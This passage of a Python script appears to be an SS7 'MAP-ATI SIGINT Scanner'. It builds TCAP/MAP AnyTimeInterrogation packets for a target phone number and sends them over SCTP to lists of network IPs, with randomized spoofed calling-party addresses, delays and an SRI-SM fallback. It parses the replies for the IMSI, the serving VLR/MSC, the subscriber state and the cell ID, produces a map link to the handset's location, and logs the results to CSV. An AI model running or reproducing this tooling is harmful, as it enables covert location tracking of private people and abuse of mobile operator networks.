            # 2. Prepare Invoke PDU using TCAP_defs_pycrate.Invoke
            invoke_id = random.randint(1, 127)
            InvokeType = TCAP_defs_pycrate.Invoke 
            invoke_pdu = deepcopy(InvokeType)
            
            opCode_field_name_in_invoke = 'opCode' 
            if opCode_field_name_in_invoke not in invoke_pdu._cont:
                logger.error(f"[{unique_id_for_log}] '{opCode_field_name_in_invoke}' field definition not found in Invoke type: {InvokeType.fullname()}")
                return None
            opCode_field_in_invoke = invoke_pdu._cont[opCode_field_name_in_invoke]
            opCode_type_definition = opCode_field_in_invoke._tr if hasattr(opCode_field_in_invoke, '_tr') and opCode_field_in_invoke._tr is not None else opCode_field_in_invoke
            
            local_op_key_name = None
            if isinstance(opCode_type_definition, CHOICE_Class_imported_construct) and hasattr(opCode_type_definition, '_cont'):
                opCode_choices = opCode_type_definition._cont 
                if 'localValue' in opCode_choices: # As per TCAP2.py
                    choice_type_ref = opCode_choices['localValue']
                    actual_choice_type = choice_type_ref._tr if hasattr(choice_type_ref, '_tr') and choice_type_ref._tr is not None else choice_type_ref
                    if isinstance(actual_choice_type, INT_Class):
                        local_op_key_name = 'localValue'
            
            if not local_op_key_name:
                if hasattr(opCode_type_definition, '_cont') and isinstance(opCode_type_definition._cont, ASN1Dict_global):
                    for key_try in opCode_type_definition._cont.keys(): 
                        choice_type_ref = opCode_type_definition._cont[key_try]
                        actual_choice_type = choice_type_ref._tr if hasattr(choice_type_ref, '_tr') and choice_type_ref._tr is not None else choice_type_ref
                        if isinstance(actual_choice_type, INT_Class):
                            local_op_key_name = key_try; break
            if not local_op_key_name:
                logger.error(f"[{unique_id_for_log}] Could not determine local opCode key in Invoke's opCode ({type(opCode_type_definition)}). Choices: {opCode_type_definition._cont if hasattr(opCode_type_definition, '_cont') else 'N/A'}")
                return None

            op_code_value_for_invoke = (local_op_key_name, MAP_OP_ANY_TIME_INTERROGATION)
            
            param_field_name_in_invoke = 'parameter' 
            if param_field_name_in_invoke not in invoke_pdu._cont:
                 logger.error(f"[{unique_id_for_log}] Field '{param_field_name_in_invoke}' not found in Invoke type: {InvokeType.fullname()}")
                 return None

            # --- MODIFIED PARAMETER HANDLING ---
            # Based on TCAP2.py, Invoke.parameter is ANY.
            # If Invoke definition in TCAP2.py DOES NOT have _param_name/_param_map linking opCode to Parameter type,
            # then pycrate will treat the ANY field as expecting raw BER data for that field.
            # We provide this as a special dictionary {'_ber_data': bytes}
            invoke_parameter_value = {'_ber_data': parameter_ber_bytes}
            # --- END MODIFICATION ---
            
            invoke_values = {
                'invokeID': invoke_id,
                'opCode': op_code_value_for_invoke,
                param_field_name_in_invoke: invoke_parameter_value 
            }
            invoke_pdu.set_val(invoke_values)
            logger.debug(f"[{unique_id_for_log}] Invoke PDU prepared: {invoke_pdu.get_val_d(legacy=True)}")

            # 3. Prepare Component CHOICE
            ComponentType = TCAP_defs_pycrate.Component 
            component_obj = deepcopy(ComponentType)
            component_obj.set_val(('invoke', invoke_pdu.get_val()))
            logger.debug(f"[{unique_id_for_log}] Component CHOICE set to 'invoke'.")

            # 4. Prepare ComponentPortion (SEQUENCE OF Component)
            ComponentPortionType = TCAP_defs_pycrate.ComponentPortion 
            cp_obj = deepcopy(ComponentPortionType)
            cp_obj.set_val([component_obj.get_val()])
            logger.debug(f"[{unique_id_for_log}] ComponentPortion SEQUENCE OF prepared.")

            # 5. Prepare DialoguePortion
            acn_oid_s = None
            if hasattr(MAP_AC_defs_pycrate, 'ApplicationCtxs') and isinstance(MAP_AC_defs_pycrate.ApplicationCtxs, (ASN1Dict_global, dict)):
                for ac_k, ac_v in MAP_AC_defs_pycrate.ApplicationCtxs.items():
                    if isinstance(ac_v, tuple) and len(ac_v) > 1 and ('map-ac-atiV3' in ac_v[1] or 'anyTimeInterrogationContextV3' in ac_v[1]):
                        acn_oid_s = ac_v[0]; break
                if not acn_oid_s and '0.4.0.0.1.0.19.3' in MAP_AC_defs_pycrate.ApplicationCtxs: acn_oid_s = '0.4.0.0.1.0.19.3'
            if not acn_oid_s: acn_oid_s = '0.4.0.0.1.0.19.3'; logger.warning(f"[{unique_id_for_log}] Using hardcoded ACN OID for ATI: {acn_oid_s}")
            try: dialogue_acn_value = tuple(map(int, acn_oid_s.split('.')))
            except ValueError as e_oid_val: logger.error(f"[{unique_id_for_log}] Invalid ACN OID string '{acn_oid_s}': {e_oid_val}"); return None

            DialoguePDU_Type = TCAP_defs_pycrate.DialoguePDU
            dialogue_pdu_instance = deepcopy(DialoguePDU_Type)
            dialogue_pdu_instance.set_val(('dialogueRequest', {'application-context-name': dialogue_acn_value}))
            
            ExternalPDU_Type = TCAP_defs_pycrate.ExternalPDU 
            dialogue_portion_obj = deepcopy(ExternalPDU_Type)
            dialogue_as_oid_val = (0,0,17,773,1,1,1) 
            
            dialogue_portion_obj.set_val({
                'oid': dialogue_as_oid_val, 
                'dialog': dialogue_pdu_instance.get_val() 
            })
            dialogue_portion_value_for_begin = dialogue_portion_obj.get_val()

            # 6. Prepare Begin PDU
            BeginType = TCAP_defs_pycrate.Begin
            begin_pdu_obj = deepcopy(BeginType)
            
            begin_pdu_values = {'otid': final_otid_bytes}
            if 'dialoguePortion' in BeginType._cont and dialogue_portion_value_for_begin:
                 begin_pdu_values['dialoguePortion'] = dialogue_portion_value_for_begin
            if 'components' in BeginType._cont and cp_obj.get_val(): 
                 begin_pdu_values['components'] = cp_obj.get_val()

            begin_pdu_obj.set_val(begin_pdu_values)
            logger.debug(f"[{unique_id_for_log}] Begin PDU prepared: {begin_pdu_obj.get_val_d(legacy=True)}")

            # 7. Prepare TCMessage CHOICE
            TCMessageType = TCAP_defs_pycrate.TCMessage
            tcap_message_obj = deepcopy(TCMessageType)
            tcap_message_obj.set_val(('begin', begin_pdu_obj.get_val()))
            logger.debug(f"[{unique_id_for_log}] TCMessage CHOICE set to 'begin'.")

            # 8. Final BER Encoding
            tcap_bytes = tcap_message_obj.to_ber()
            logger.info(f"[{unique_id_for_log}] Built TCAP Begin PDU using TCAP2.py definitions (len {len(tcap_bytes)} B).")
            
            def sccp_addr_dict(ssn,gt,tt,np,nai,es): return {'ssn':ssn,'gt':('globalTitleFormat1',{'translationType':tt,'numberingPlan':np,'encodingScheme':es,'natureOfAddressIndicator':nai,'addressSignal':str(gt)}),'ri':0}
            def sccp_addr_obj(d,uid_sccp):
                if SCCP_defs_pycrate is None or not hasattr(SCCP_defs_pycrate,'SCCPAddress'):raise RuntimeError(f"[{uid_sccp}] SCCPAddress definition missing")
                o=deepcopy(SCCP_defs_pycrate.SCCPAddress);o.set_val(d);return o
            cdpa=sccp_addr_obj(sccp_addr_dict(args.cdpa_ssn,args.target_msisdn,args.cdpa_tt,args.cdpa_np,args.cdpa_nai,args.cdpa_es),unique_id_for_log)
            cgpa=sccp_addr_obj(sccp_addr_dict(args.used_cgpa_ssn,args.used_cgpa_gt,args.cgpa_tt,args.cgpa_np,args.cgpa_nai,args.cgpa_es),unique_id_for_log)
            sccp_val={'protocolClass':args.used_sccp_pc&0x0F,'calledPartyAddress':cdpa.get_val(),'callingPartyAddress':cgpa.get_val(),'data':tcap_bytes}
            if SCCP_defs_pycrate is None or not hasattr(SCCP_defs_pycrate,'SCCPUnitData'):logger.error(f"[{unique_id_for_log}] SCCPUnitData missing.");return None
            sccp_o=deepcopy(SCCP_defs_pycrate.SCCPUnitData);sccp_o.set_val(sccp_val)
            sccp_final=sccp_o.to_bytes() 
            logger.info(f"[{unique_id_for_log}] Built SCCP UDT PDU (len {len(sccp_final)} B).")
            return sccp_final

        except PycrateASN1ObjErr as e_asn1_build: 
            logger.error(f"[{unique_id_for_log}] Pycrate ASN1ObjErr during PDU construction: {e_asn1_build}", exc_info=True)
            return None
        except Exception as e: 
            logger.error(f"[{unique_id_for_log}] Generic Error during PDU construction: {e}", exc_info=True) 
            return None

# ... (Rest of the script: process_ip, main, etc. remain the same)
def process_ip(ip:str,port:int,args:argparse.Namespace,otid:bytes,variant:AtiVariant,is_fallback:bool=False,attempt:int=1)->TypingDict[str,Any]:
    uid=f"{ip}:{port} OTID:{otid.hex()} Op:{variant.name if not is_fallback else 'SRI-SM'} Att:{attempt}";logger.debug(f"--- Start process_ip: {uid} ---")
    if args.min_delay > 0 and args.max_delay >= args.min_delay: time.sleep(random.uniform(args.min_delay, args.max_delay))
    start_T=time.perf_counter()
    cgpa_ssn=random.choice(args.cgpa_ssn_pool or DEFAULT_CGPA_SSN_POOL)
    cgpa_gt=random.choice(args.cgpa_gt_list_from_file) if args.cgpa_gt_list_from_file else generate_dynamic_cgpa_gt(args.cgpa_gt_digits,f"{ip}-{port}-{otid.hex()}-{attempt}",args.cgpa_min_len,args.cgpa_max_len,args.cgpa_digits_only)
    sccp_pc=random.choice(args.sccp_proto_class_pool or DEFAULT_SCCP_PROTO_CLASS_POOL)
    args_pdu=deepcopy(args);args_pdu.used_cgpa_gt=cgpa_gt;args_pdu.used_cgpa_ssn=cgpa_ssn;args_pdu.used_sccp_pc=sccp_pc
    res:TypingDict[str,Any]={"ip":ip,"port":port,"timestamp":datetime.now().isoformat(),"sent_otid":otid.hex(),"used_cgpa_gt":cgpa_gt,"used_cgpa_ssn":cgpa_ssn,"used_sccp_pc":sccp_pc,"ati_variant_used":variant.value if not is_fallback else "N/A (SRI-SM)","is_fallback":is_fallback,"attempt_number":attempt,"dtid_match_status":"N/A","sccp_data_ptr_valid":"N/A","mcc":"N/A","mnc":"N/A","lac":"N/A","cell_id":"N/A","cgi_hex_full":"N/A","cgi_dec":"N/A","maps_link":"N/A","imsi":"N/A","vlr_name":"N/A","msc_name":"N/A","subscriber_state_interpreted":"Not Provided","subscriber_state_raw":"N/A","sri_sm_msc_address":"N/A","error_info":"N/A","raw_response_hex":"N/A","duration_ms":0.0,"tcap_outcome":"NoResponse_Preflight","timeout_phase":"N/A"}
    op_type_log="SRI-SM" if is_fallback else f"ATI({variant.name})"
    if attempt>1 and not is_fallback:op_type_log+=f"_Att{attempt}"
    panel_clr="yellow";s=None;success_resp=False;tcap_payload_resp=None;sccp_pdu_to_send=None
    final_otid_pdu=bytes([0xAB])+otid[:3] if args.otid_pattern=="prefixed" else otid
    
    logger.debug(f"[{uid}] Pre-PDU Build Check: PYCRATE_AVAILABLE={PYCRATE_AVAILABLE}, TCAP_defs_pycrate is {'Loaded' if TCAP_defs_pycrate else 'Not Loaded'}")
    if PYCRATE_AVAILABLE and TCAP_defs_pycrate and MAP_defs_pycrate : 
        logger.info(f"[{uid}] Attempting PDU construction with pycrate for {op_type_log}.")
        sccp_pdu_to_send=build_full_pdu_with_pycrate(final_otid_pdu,variant,args_pdu,uid)
        if not sccp_pdu_to_send:res.update({"tcap_outcome":f"BuildError_Pycrate_{op_type_log}","error_info":f"Pycrate PDU construction failed for {op_type_log}."})
        else:res["tcap_outcome"]=f"PDU_Built_Pycrate_{op_type_log}"
    else:
        logger.warning(f"[{uid}] PYCRATE_AVAILABLE is {PYCRATE_AVAILABLE} or TCAP/MAP definitions not fully loaded. Cannot use pycrate for {op_type_log}.")
        res.update({"tcap_outcome":f"ASN1_Defs_Error_{op_type_log}","error_info":"Pycrate core libs or TCAP/MAP ASN.1 definitions not fully loaded/initialized."}) 
    
    if sccp_pdu_to_send:
        try:
            logger.info(f"[{uid}] Sending {op_type_log} PDU ({len(sccp_pdu_to_send)}B). CgPA GT:{cgpa_gt},SSN:{cgpa_ssn},SCCP PC:0x{sccp_pc:02X}")
            if logger.isEnabledFor(logging.DEBUG):logger.debug(f"[{uid}] SCCP PDU Hex: {sccp_pdu_to_send.hex()}")
            res["timeout_phase"]="Connecting";s=sctp.sctpsocket_tcp(socket.AF_INET);s.settimeout(args.sctp_timeout);s.connect((ip,port))
            res["timeout_phase"]="Sending";s.sctp_send(sccp_pdu_to_send,ppid=socket.htonl(args.sctp_ppid))
            res["timeout_phase"]="Receiving";raw_resp=s.recv(8192);logger.info(f"[{uid}] Received {len(raw_resp)} bytes.");res["timeout_phase"]="N/A"
            if not raw_resp:logger.warning(f"[{uid}] EmptyResponse.");res.update({"error_info":"EmptyResponse","tcap_outcome":"EmptyResponse"});panel_clr="red"
            else:
                res["raw_response_hex"]=hexdump.hexdump(raw_resp,'return') if hexdump else binascii.hexlify(raw_resp).decode()
                
                if len(raw_resp)<5:res.update({"error_info":f"RespTooShortSCCP({len(raw_resp)}B)","tcap_outcome":"MalformedSCCP_Resp"});panel_clr="red"
                else: 
                    sccp_msg_type = raw_resp[0]
                    if sccp_msg_type == 0x09: 
                        ptr_data_sccp_val = raw_resp[4] ; param_section_start_idx = 5 
                        sccp_data_param_actual_start = param_section_start_idx + ptr_data_sccp_val -1 
                        
                        if sccp_data_param_actual_start + 1 < len(raw_resp): 
                            if raw_resp[sccp_data_param_actual_start] == 0x03: 
                                res["sccp_data_ptr_valid"]="Valid"
                                data_param_val_len = raw_resp[sccp_data_param_actual_start + 1]
                                tcap_payload_start_in_sccp_data = sccp_data_param_actual_start + 2 
                                if tcap_payload_start_in_sccp_data + data_param_val_len <= len(raw_resp):
                                    tcap_payload_resp = raw_resp[tcap_payload_start_in_sccp_data : tcap_payload_start_in_sccp_data + data_param_val_len]
                                else: 
                                    res.update({"error_info":f"SCCP_TCAP_ExtractionErr(Data len {data_param_val_len} from offset {tcap_payload_start_in_sccp_data} exceeds SCCP data {len(raw_resp)})","tcap_outcome":"MalformedSCCP_TCAP_Resp"});panel_clr="red";tcap_payload_resp=None
                            else:
                                res.update({"error_info":f"InvalidSCCPDataParamID(PtrVal:{ptr_data_sccp_val}, ExpectParamID:0x03, ActualParamID@{sccp_data_param_actual_start}:{raw_resp[sccp_data_param_actual_start] if sccp_data_param_actual_start<len(raw_resp) else 'OOB'})","tcap_outcome":"MalformedSCCP_Resp"});panel_clr="red";tcap_payload_resp=None
                        else:
                            res.update({"error_info":f"InvalidSCCPDataPtr(PtrVal:{ptr_data_sccp_val} points beyond resp len {len(raw_resp)})","tcap_outcome":"MalformedSCCP_Resp"});panel_clr="red";tcap_payload_resp=None
                    else: 
                        res.update({"error_info":f"UnexpectedSCCPMsgType(0x{sccp_msg_type:02X})","tcap_outcome":"MalformedSCCP_Resp"});panel_clr="red";tcap_payload_resp=None

                if tcap_payload_resp and len(tcap_payload_resp)>=2: 
                    tcap_type=tcap_payload_resp[0];tcap_msg_content=None
                    try:
                        ber_len_decoder = get_ber_length_decoder()
                        if ber_len_decoder:
                            parsed_len_obj = ber_len_decoder.parse(tcap_payload_resp[1:])
                            tcap_len_val_inner_manual = parsed_len_obj if isinstance(parsed_len_obj, int) else getattr(parsed_len_obj, 'actual_length', len(tcap_payload_resp[1:]))
                        else: 
                            tcap_len_val_inner_manual = len(tcap_payload_resp[1:]) if len(tcap_payload_resp) > 1 else 0

                        len_fld_tcap_inner_manual = len(build_ber_length(tcap_len_val_inner_manual))
                        
                        tcap_msg_content_start = 1 + len_fld_tcap_inner_manual
                        if tcap_msg_content_start + tcap_len_val_inner_manual <= len(tcap_payload_resp):
                            tcap_msg_content = tcap_payload_resp[tcap_msg_content_start : tcap_msg_content_start + tcap_len_val_inner_manual]
                        else:
                            raise ValueError(f"TCAP content length error: Declared {tcap_len_val_inner_manual}, available after len field {len(tcap_payload_resp) - tcap_msg_content_start}")
                    except Exception as e_ber_resp:
                        res.update({"error_info":f"TCAPLenErr_Inner({e_ber_resp})","tcap_outcome":"MalformedTCAP_Resp"});panel_clr="red"; tcap_msg_content=None
                        
                    if tcap_msg_content:
                        dtid_val,_,_ = find_tlv(tcap_msg_content, TCAP_TAG_DTID)
                        res["dtid_match_status"]="Match" if dtid_val==final_otid_pdu else "Mismatch" if dtid_val else "NotFound"
                        
                        comp_port_val_resp,_,_ = find_tlv(tcap_msg_content, TCAP_TAG_COMPONENT_PORTION)

                        if tcap_type in (TCAP_MSG_U_ABORT_TAG,TCAP_MSG_P_ABORT_TAG):res.update({"tcap_outcome":f"TCAP_Abort(0x{tcap_type:02X})"});panel_clr="red"
                        elif tcap_type in (TCAP_MSG_END_TAG,TCAP_MSG_CONTINUE_TAG) and comp_port_val_resp and AnyTimeInterrogationRes_Construct_Manual:
                            comp_offset=0;parsed_comp=False
                            while comp_offset<len(comp_port_val_resp): 
                                act_tag=comp_port_val_resp[comp_offset];comp_offset_after_tag=comp_offset+1;
                                if comp_offset_after_tag>=len(comp_port_val_resp):break
                                act_len_val=0;act_val=b''
                                try:
                                    ber_len_decoder_comp = get_ber_length_decoder()
                                    if ber_len_decoder_comp:
                                        parsed_len_obj_comp = ber_len_decoder_comp.parse(comp_port_val_resp[comp_offset_after_tag:])
                                        act_len_val = parsed_len_obj_comp if isinstance(parsed_len_obj_comp, int) else getattr(parsed_len_obj_comp, 'actual_length', 0)
                                    elif comp_offset_after_tag < len(comp_port_val_resp): 
                                        act_len_val = comp_port_val_resp[comp_offset_after_tag] 
                                        if act_len_val & 0x80 : 
                                            logger.warning(f"[{uid}] Basic fallback for BER length encountered long form, parsing may be incorrect.")
                                            act_len_val = 0 
                                    else:
                                        act_len_val = 0

                                    len_octs_val=len(build_ber_length(act_len_val))
                                    comp_val_start=comp_offset_after_tag+len_octs_val
                                    if comp_val_start+act_len_val > len(comp_port_val_resp):logger.debug(f"[{uid}] Comp length issue. Tag:{act_tag:02X}, Declared:{act_len_val}, Avail:{len(comp_port_val_resp)-comp_val_start}");break
                                    act_val=comp_port_val_resp[comp_val_start:comp_val_start+act_len_val]
                                    comp_offset = comp_val_start + act_len_val
                                    
                                    if act_tag==TCAP_COMP_RETURN_RESULT_LAST_TAG:
                                        res["tcap_outcome"]="ReturnResultLast"
                                        try:
                                            if AnyTimeInterrogationRes_Construct_Manual and globals().get('Int16ub_ref'): 
                                                p_map=AnyTimeInterrogationRes_Construct_Manual.parse(act_val)
                                                if p_map.subscriberInfo and 'imsi' in p_map.subscriberInfo and p_map.subscriberInfo.imsi: res["imsi"]=p_map.subscriberInfo.imsi; success_resp=True
                                                if p_map.locationInformation:
                                                    success_resp=True
                                                    if 'vlrName' in p_map.locationInformation and p_map.locationInformation.vlrName: res["vlr_name"]=p_map.locationInformation.vlrName.digits
                                                    if 'mscName' in p_map.locationInformation and p_map.locationInformation.mscName: res["msc_name"]=p_map.locationInformation.mscName.digits
                                                    if 'cellGlobalId' in p_map.locationInformation and p_map.locationInformation.cellGlobalId and 'plmn_raw' in p_map.locationInformation.cellGlobalId:
                                                        cgi=p_map.locationInformation.cellGlobalId
                                                        mcc,mnc = ("N/A", "N/A") 
                                                        if 'parse_mcc_mnc' in globals():
                                                                mcc,mnc=parse_mcc_mnc(cgi.plmn_raw)
                                                        else:
                                                                if logger: logger.warning("parse_mcc_mnc function not found.")

                                                        lac_raw_bytes = getattr(cgi, 'lac_raw', b'\x00\x00'); ci_raw_bytes = getattr(cgi, 'ci_raw', b'\x00\x00')
                                                        lac,ci=Int16ub_ref.parse(lac_raw_bytes),Int16ub_ref.parse(ci_raw_bytes)
                                                        if mcc!="N/A":res.update({"mcc":mcc,"mnc":mnc,"lac":lac,"cell_id":ci,"cgi_found":True});res["cgi_hex_full"]=f"{binascii.hexlify(cgi.plmn_raw).decode()}-{lac:04X}-{ci:04X}";res["cgi_dec"]=f"{mcc}:{mnc}:{lac}:{ci}";res["maps_link"]=f"http://opencellid.org/#mcc={mcc}&mnc={mnc}&lac={lac}&cellid={ci}";panel_clr="bold green"
                                                if p_map.subscriberState: 
                                                    sub_state_interp = "Not Parsed (interpret_sub_state missing)"
                                                    if 'interpret_sub_state' in globals():
                                                        sub_state_interp = interpret_sub_state(p_map.subscriberState)
                                                    else:
                                                        if logger: logger.warning("interpret_sub_state function not found.")
                                                    res["subscriber_state_interpreted"] = sub_state_interp
                                                    res["subscriber_state_raw"] = f"Tag:0x{p_map.subscriberState.tag:02X},Val:{binascii.hexlify(p_map.subscriberState.val).decode()}"; success_resp=True
                                                
                                                if success_resp and panel_clr not in ["bold green","bold blue"]:panel_clr="bold cyan"
                                                elif not success_resp:res["error_info"]="ATI Result, no useful data";panel_clr="yellow"
                                        except Exception as e_map_parse:res["error_info"]=f"MAPParseErr:{e_map_parse}";panel_clr="red";logger.exception(f"[{uid}] MAP Parse Err Resp")
                                        parsed_comp=True;break
                                    elif act_tag==TCAP_COMP_RETURN_ERROR_TAG: res.update({"tcap_outcome":"ReturnError","error_info":interpret_map_error_code(act_val)});panel_clr="red";parsed_comp=True;break
                                    elif act_tag==TCAP_COMP_REJECT_TAG: res.update({"tcap_outcome":"Reject","error_info":f"TCAP Reject (Tag {act_tag:02X}, Val: {binascii.hexlify(act_val).decode()})" });panel_clr="yellow";parsed_comp=True;break
                                except Exception as e_ctl:logger.debug(f"[{uid}] Err parsing comp TLV (manual): {e_ctl}");break
                            if not parsed_comp:res.update({"tcap_outcome":f"TCAP_EndCont_NoKnownComp(0x{tcap_type:02X})"});panel_clr="yellow"
                        else:res.update({"tcap_outcome":f"UnexpectedTCAP(0x{tcap_type:02X})"});panel_clr="orange_red1"
        except socket.timeout:res.update({"error_info":f"SCTP Timeout({op_type_log}) during {res.get('timeout_phase','?')}", "tcap_outcome":"Timeout"});panel_clr="red"
        except sctp.sctperror as e:res.update({"error_info":f"SCTP Err({op_type_log}):{e}","tcap_outcome":"SCTPError"});panel_clr="red"
        except ConnectionRefusedError:res.update({"error_info":f"ConnRefused({op_type_log})","tcap_outcome":"ConnectionRefused"});panel_clr="red"
        except OSError as e:res.update({"error_info":f"OSNetworkErr({op_type_log}):{e}","tcap_outcome":"NetworkError"});panel_clr="red"
        except Exception as e:logger.exception(f"[{uid}] Unexpected Exception in process_ip");res.update({"error_info":f"UnexpectedErr({op_type_log}):{str(e)[:100]}","tcap_outcome":"ScriptError"});panel_clr="red"
        finally:
            if s:
                try:s.close()
                except:pass
        
    res["duration_ms"]=(time.perf_counter()-start_T)*1000;logger.debug(f"--- End process_ip: {uid} --- Outcome: {res['tcap_outcome']}")
    final_clr=panel_clr
    if res.get("cgi_found"):final_clr="bold green"
    elif success_resp and final_clr not in ["bold green","red","bold red","orange_red1"]:final_clr="bold cyan" if not res.get("is_fallback") else "bold blue"
    crit_outcomes=["Timeout","SCTPError","ConnectionRefused","ScriptError","NetworkError","BuildError","Malformed","Pycrate_Unavailable","Pycrate_Init_Error", "ASN1_Defs_Error"]
    if any(c in res["tcap_outcome"] for c in crit_outcomes) or "Abort" in res["tcap_outcome"]:final_clr="red"
    title=f"IP:{ip}:{port} ({op_type_log}|OTID:{res['sent_otid']}|CgPA:{res['used_cgpa_gt']})"
    txt=Text();
    if res.get("cgi_found"):txt.append(f"CGI:MCC:{res['mcc']},MNC:{res['mnc']},LAC:{res['lac']},CI:{res['cell_id']}\n",style="green");
    if res.get("maps_link")!="N/A" and res.get("cgi_found"):txt.append(f" Map:{res['maps_link']}\n")
    if res["imsi"]!="N/A":txt.append(f"IMSI:{res['imsi']}\n",style="cyan" if final_clr=="bold cyan" else "")
    if res["vlr_name"]!="N/A":txt.append(f"VLR Name:{res['vlr_name']}\n",style="cyan" if final_clr=="bold cyan" else "")
    if res["msc_name"]!="N/A":txt.append(f"MSC Name:{res['msc_name']}\n",style="cyan" if final_clr=="bold cyan" else "")
    if res["sri_sm_msc_address"]!="N/A":txt.append(f"SRI MSC:{res['sri_sm_msc_address']}\n",style="blue")
    if res["subscriber_state_interpreted"]!="Not Provided":txt.append(f"State:{res['subscriber_state_interpreted']}\n")
    if res["error_info"]!="N/A":txt.append(f"Outcome:{res['tcap_outcome']}\nDetails:{res['error_info']}\n")
    elif not success_resp and final_clr not in ["bold cyan","bold green","bold blue"]:txt.append(f"Outcome:{res['tcap_outcome']}\n")
    txt.append(f"DTID Match:{res['dtid_match_status']}\nDuration:{res['duration_ms']:.2f}ms")
    if res["timeout_phase"] not in ["N/A","Receiving"] and "Timeout" in res.get("error_info",""):txt.append(f"\nTimeout Phase:{res['timeout_phase']}")
    console.print(Panel(txt,title=title,border_style=final_clr,expand=False,subtitle=f"TCAP:{res['tcap_outcome']}"))
    r_dir=Path(args.results_dir);ip_f=f"{ip.replace(':','_')}_p{port}"
    if success_resp:
        ip_s_dir=r_dir/"successful_targets"/ip.replace(":","_");ip_s_dir.mkdir(parents=True,exist_ok=True)
        ip_csv=ip_s_dir/f"{ip_f}_{op_type_log}_results.csv";ip_raw=ip_s_dir/f"{ip_f}_{op_type_log}_raw_tcap.log"
        lock_key=f"{ip_f}_{op_type_log}"
        lock = None
        if 'get_per_ip_file_lock' in globals(): 
            lock = get_per_ip_file_lock(lock_key)
        else:
            if logger: logger.warning("get_per_ip_file_lock function not found. File writing will not be thread-safe per IP.")
            lock = threading.Lock() 

        with lock:
            hdr=sys.modules['__main__'].fixed_csv_header_keys;exists=ip_csv.exists()
            with open(ip_csv,'a',newline='',encoding='utf-8') as f:
                if not exists or os.path.getsize(ip_csv)==0:f.write(",".join(hdr)+"\n")
                f.write(",".join(str(res.get(k,"")).replace(","," ").replace("\n"," ") for k in hdr)+"\n")
    if res.get("raw_response_hex") and tcap_payload_resp:
        raw_lock_key = f"{ip_f}_{op_type_log}_raw_specific" 
        raw_lock = get_per_ip_file_lock(raw_lock_key) if 'get_per_ip_file_lock' in globals() else threading.Lock()
        with raw_lock: 
            with open(ip_raw,'a',encoding='utf-8') as f:f.write(f"{res['timestamp']}-OTID:{res['sent_otid']}-Op:{op_type_log}\nTCAP Hex:\n{binascii.hexlify(tcap_payload_resp).decode()}\n---\nFull Raw:\n{res['raw_response_hex']}\n---\n")
    if not args.no_csv:
        with main_csv_lock:
            m_csv=r_dir/"master_scan_summary.csv";hdr_m=sys.modules['__main__'].fixed_csv_header_keys;exists_m=m_csv.exists()
            with open(m_csv,'a',newline='',encoding='utf-8') as f:
                if not exists_m or os.path.getsize(m_csv)==0:f.write(",".join(hdr_m)+"\n")
                f.write(",".join(str(res.get(k,"")).replace(","," ").replace("\n"," ") for k in hdr_m)+"\n")
    return res

fixed_csv_header_keys = []

def parse_ports_cli(ports_str: Optional[str]) -> list[int]:
    ports=set();
    if not ports_str:return DEFAULT_SCTP_PORTS_INTERNAL
    try:
        for p in ports_str.split(','):
            p=p.strip();
            if not p:continue
            if '-' in p:
                s,e=map(int,p.split('-',1));
                if 0<s<=e<65536:ports.update(range(s,e+1))
            else:
                pv=int(p);
                if 0<pv<65536:ports.add(pv)
    except ValueError:pass
    return sorted(list(ports)) if ports else DEFAULT_SCTP_PORTS_INTERNAL

def parse_int_list_pool(val_str: str) -> list[int]: 
    if not val_str:return[];
    try:return [int(x.strip(),0) for x in val_str.split(',') if x.strip()]
    except ValueError:raise argparse.ArgumentTypeError(f"Invalid int list: '{val_str}'")

def main():
    global fixed_csv_header_keys, logger, PYCRATE_AVAILABLE, pycrate_core_types_loaded_check 
    global logger_init_pycrate_info, logger_init_construct_info
    global TCAP_defs_pycrate, MAP_defs_pycrate 

    parser = argparse.ArgumentParser(description="MAP-ATI SIGINT Scanner - Pycrate Only", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("ips_file", nargs='?', default=DEFAULT_IPS_FILE)
    parser.add_argument("--target-msisdn", default=DEFAULT_TARGET_MSISDN)
    cg=parser.add_argument_group('CgPA Config');cg.add_argument("--cgpa-gt-digits",default=DEFAULT_CGPA_GT_DIGITS);cg.add_argument("--cgpa-min-len",type=int,default=11);cg.add_argument("--cgpa-max-len",type=int,default=14);cg.add_argument("--cgpa-digits-only",action="store_true");cg.add_argument("--cgpa-gt-file",default=None)
    sc=parser.add_argument_group('SCCP Config');a=sc.add_argument;a("--cdpa-ssn",type=int,default=DEFAULT_CDPA_SSN);a("--cdpa-tt",type=int,default=DEFAULT_CDPA_TT);a("--cdpa-np",type=int,default=DEFAULT_CDPA_NP);a("--cdpa-es",type=int,default=DEFAULT_CDPA_ES);a("--cdpa-nai",type=int,default=DEFAULT_CDPA_NAI);a("--sccp-cdpa-ai",type=lambda x:int(x,0),default=0x12);a("--cgpa-ssn-pool",type=parse_int_list_pool,default=",".join(map(str,DEFAULT_CGPA_SSN_POOL)));a("--cgpa-tt",type=int,default=DEFAULT_CGPA_TT);a("--cgpa-np",type=int,default=DEFAULT_CGPA_NP);a("--cgpa-es",type=int,default=DEFAULT_CGPA_ES);a("--cgpa-nai",type=int,default=DEFAULT_CGPA_NAI);a("--sccp-cgpa-ai",type=lambda x:int(x,0),default=0x12);a("--sccp-proto-class-pool",type=parse_int_list_pool,default=",".join(map(str,DEFAULT_SCCP_PROTO_CLASS_POOL)))
    st=parser.add_argument_group('SCTP Config');a=st.add_argument;a("--sctp-ports",default=None);a("--sctp-ppid",type=lambda x:int(x,0),default=DEFAULT_SCTP_PPID);a("--sctp-timeout",type=int,default=DEFAULT_SCTP_TIMEOUT)
    ex=parser.add_argument_group('Execution Ctrl');a=ex.add_argument;a("--threads",type=int,default=DEFAULT_MAX_WORKERS);a("--results-dir",default=DEFAULT_RESULTS_DIR);a("--no-csv",action='store_true');a("--log-level",default="INFO",choices=["DEBUG","INFO","WARNING","ERROR","CRITICAL"]);a("--debug-hex-file",help="Hex payload for debug parsing");a("--min-delay",type=float,default=0.0);a("--max-delay",type=float,default=0.0)
    si=parser.add_argument_group('SIGINT Features');a=si.add_argument;a("--ati-variant",type=AtiVariant,choices=list(AtiVariant),default=AtiVariant.STANDARD);a("--auto-ati-variant-sequence",action="store_true");a("--otid-pattern",choices=["random","prefixed"],default="random");a("--inject-noise",action="store_true");a("--noise-length",type=int,default=5); a("--enable-sri-fallback",action="store_true",default=False)
    args = parser.parse_args()
    
    rp=Path(args.results_dir);rp.mkdir(parents=True,exist_ok=True);log_f=rp/"pycrate_only_scanner.log"
